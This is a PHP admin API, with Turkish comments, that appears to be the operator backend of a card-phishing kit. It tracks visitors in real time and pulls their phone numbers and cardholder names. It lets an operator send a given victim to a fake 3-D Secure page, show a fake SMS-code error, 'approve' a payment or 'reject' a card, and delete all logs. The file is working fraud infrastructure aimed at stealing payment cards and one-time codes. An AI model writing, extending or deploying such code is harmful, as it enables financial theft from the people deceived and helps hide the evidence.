<?php
session_start();

// Güvenlik helper'ı dahil et
require_once 'security.php';

// Config dosyasını dahil et
require_once 'config.php';

// Session güvenliği
Security::secure_session();

header('Content-Type: application/json');

// Veritabanı bağlantısı
try {
    $pdo = getDbConnection();
    
    // Online users tablosunu oluştur veya güncelle
    $pdo->exec("
        CREATE TABLE IF NOT EXISTS online_users (
            id INT AUTO_INCREMENT PRIMARY KEY,
            session_id VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL UNIQUE,
            user_identifier VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL,
            ip_address VARCHAR(45) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
            current_page VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
            user_agent TEXT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
            last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            INDEX idx_session (session_id),
            INDEX idx_user_identifier (user_identifier),
            INDEX idx_last_activity (last_activity)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    ");
    
    // Kolon yoksa ekle (MySQL 5.7+ için)
    try {
        $pdo->exec("ALTER TABLE online_users ADD COLUMN user_identifier VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL AFTER session_id");
    } catch(PDOException $e) {
        // Kolon zaten varsa hata vermez
    }
    
    try {
        $pdo->exec("ALTER TABLE online_users ADD INDEX idx_user_identifier (user_identifier)");
    } catch(PDOException $e) {
        // Index zaten varsa hata vermez
    }
    
    // Collation'ı düzelt
    try {
        $pdo->exec("ALTER TABLE online_users 
            MODIFY session_id VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
            MODIFY user_identifier VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL,
            MODIFY ip_address VARCHAR(45) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
            MODIFY current_page VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL
        ");
    } catch(PDOException $e) {
        // Hata vermez
    }
    
} catch(PDOException $e) {
    die(json_encode(['success' => false, 'message' => 'Database error']));
}

$action = Security::xss_clean($_REQUEST['action'] ?? '');

switch($action) {
    case 'get_online_users':
        getOnlineUsers($pdo);
        break;
    
    case 'online_count':
        getOnlineCount($pdo);
        break;
    
    case 'get_guests':
        getGuests($pdo);
        break;
    
    case 'guest_count':
        getGuestCount($pdo);
        break;
    
    case 'get_all_users':
        getAllUsers($pdo);
        break;
    
    case 'send_redirect':
        sendRedirect($pdo);
        break;
    
    case 'approve_payment':
        approvePayment($pdo);
        break;
    
    case 'reject_sms':
        rejectSMS($pdo);
        break;
    
    case 'reject_card':
        rejectCard($pdo);
        break;
    
    case 'delete_user':
        deleteUser($pdo);
        break;

    case 'delete_all_users':
        deleteAllUsers($pdo);
        break;

    default:
        echo json_encode(['success' => false, 'message' => 'Invalid action']);
}

function getOnlineUsers($pdo) {
    try {
        $stmt = $pdo->query("
            SELECT 
                o.*,
                u.id as user_id,
                u.identifier_value,
                u.phone,
                u.card_holder,
                TIMESTAMPDIFF(MICROSECOND, o.last_activity, NOW()) / 1000000 as seconds_ago
            FROM online_users o
            LEFT JOIN users u ON o.user_identifier COLLATE utf8mb4_unicode_ci = u.user_identifier COLLATE utf8mb4_unicode_ci
            WHERE o.last_activity > DATE_SUB(NOW(), INTERVAL 5 MINUTE)
            AND o.user_identifier IS NOT NULL
            ORDER BY o.last_activity DESC
        ");
        $users = $stmt->fetchAll(PDO::FETCH_ASSOC);
        
        echo json_encode(['success' => true, 'users' => $users]);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => $e->getMessage()]);
    }
}

function getOnlineCount($pdo) {
    try {
        $count = $pdo->query("
            SELECT COUNT(*) FROM online_users 
            WHERE last_activity > DATE_SUB(NOW(), INTERVAL 5 MINUTE)
            AND user_identifier IS NOT NULL
        ")->fetchColumn();
        
        echo json_encode(['success' => true, 'count' => $count]);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => $e->getMessage()]);
    }
}

function getGuests($pdo) {
    try {
        $stmt = $pdo->query("
            SELECT 
                *,
                TIMESTAMPDIFF(MICROSECOND, last_activity, NOW()) / 1000000 as seconds_ago
            FROM online_users 
            WHERE last_activity > DATE_SUB(NOW(), INTERVAL 5 MINUTE)
            AND user_identifier IS NULL
            ORDER BY last_activity DESC
        ");
        $guests = $stmt->fetchAll(PDO::FETCH_ASSOC);
        
        echo json_encode(['success' => true, 'guests' => $guests]);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => $e->getMessage()]);
    }
}

function getGuestCount($pdo) {
    try {
        $count = $pdo->query("
            SELECT COUNT(*) FROM online_users 
            WHERE last_activity > DATE_SUB(NOW(), INTERVAL 5 MINUTE)
            AND user_identifier IS NULL
        ")->fetchColumn();
        
        echo json_encode(['success' => true, 'count' => $count]);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => $e->getMessage()]);
    }
}

function getAllUsers($pdo) {
    try {
        $stmt = $pdo->query("
            SELECT 
                u.*,
                o.current_page,
                o.last_activity,
                TIMESTAMPDIFF(MICROSECOND, o.last_activity, NOW()) / 1000000 as seconds_ago
            FROM users u
            LEFT JOIN online_users o ON u.user_identifier COLLATE utf8mb4_unicode_ci = o.user_identifier COLLATE utf8mb4_unicode_ci
                AND o.last_activity > DATE_SUB(NOW(), INTERVAL 5 MINUTE)
            ORDER BY u.created_at DESC
        ");
        $users = $stmt->fetchAll(PDO::FETCH_ASSOC);
        
        echo json_encode(['success' => true, 'users' => $users]);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => $e->getMessage()]);
    }
}

function sendRedirect($pdo) {
    $userId = Security::validate_numeric($_POST['user_id'] ?? 0, 1, 11);
    
    if (!$userId) {
        echo json_encode(['success' => false, 'message' => 'Geçersiz kullanıcı ID']);
        return;
    }
    
    try {
        $stmt = $pdo->prepare("UPDATE users SET redirect_url = '3dredirect.php', updated_at = NOW() WHERE id = ?");
        $stmt->execute([$userId]);
        
        echo json_encode(['success' => true]);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => 'Veritabanı hatası']);
    }
}

function approvePayment($pdo) {
    $userId = Security::validate_numeric($_POST['user_id'] ?? 0, 1, 11);
    
    if (!$userId) {
        echo json_encode(['success' => false, 'message' => 'Geçersiz kullanıcı ID']);
        return;
    }
    
    try {
        $stmt = $pdo->prepare("UPDATE users SET payment_status = 'approved', redirect_url = 'success.php', updated_at = NOW() WHERE id = ?");
        $stmt->execute([$userId]);
        
        echo json_encode(['success' => true]);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => 'Veritabanı hatası']);
    }
}

function rejectSMS($pdo) {
    $userId = Security::validate_numeric($_POST['user_id'] ?? 0, 1, 11);
    
    if (!$userId) {
        echo json_encode(['success' => false, 'message' => 'Geçersiz kullanıcı ID']);
        return;
    }
    
    try {
        $stmt = $pdo->prepare("UPDATE users SET payment_status = 'sms_waiting', redirect_url = 'acs/diger.php?hata=true', updated_at = NOW() WHERE id = ?");
        $stmt->execute([$userId]);
        
        echo json_encode(['success' => true]);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => 'Veritabanı hatası']);
    }
}

function rejectCard($pdo) {
    $userId = Security::validate_numeric($_POST['user_id'] ?? 0, 1, 11);
    
    if (!$userId) {
        echo json_encode(['success' => false, 'message' => 'Geçersiz kullanıcı ID']);
        return;
    }
    
    try {
        $stmt = $pdo->prepare("UPDATE users SET payment_status = 'rejected_card', redirect_url = 'error_card.php', updated_at = NOW() WHERE id = ?");
        $stmt->execute([$userId]);
        
        echo json_encode(['success' => true]);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => 'Veritabanı hatası']);
    }
}

function deleteUser($pdo) {
    $userId = Security::validate_numeric($_POST['user_id'] ?? 0, 1, 11);
    
    if (!$userId) {
        echo json_encode(['success' => false, 'message' => 'Geçersiz kullanıcı ID']);
        return;
    }
    
    try {
        $stmt = $pdo->prepare("SELECT user_identifier FROM users WHERE id = ?");
        $stmt->execute([$userId]);
        $user = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if ($user && $user['user_identifier']) {
            $stmt = $pdo->prepare("DELETE FROM online_users WHERE user_identifier = ?");
            $stmt->execute([$user['user_identifier']]);
        }
        
        $stmt = $pdo->prepare("DELETE FROM users WHERE id = ?");
        $stmt->execute([$userId]);
        
        echo json_encode(['success' => true, 'message' => 'Kullanıcı silindi']);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => 'Veritabanı hatası']);
    }
}

function deleteAllUsers($pdo) {
    try {
        $pdo->exec("DELETE FROM online_users");
        $pdo->exec("DELETE FROM users");
        echo json_encode(['success' => true, 'message' => 'Tüm loglar silindi']);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => 'Veritabanı hatası']);
    }
}
?>
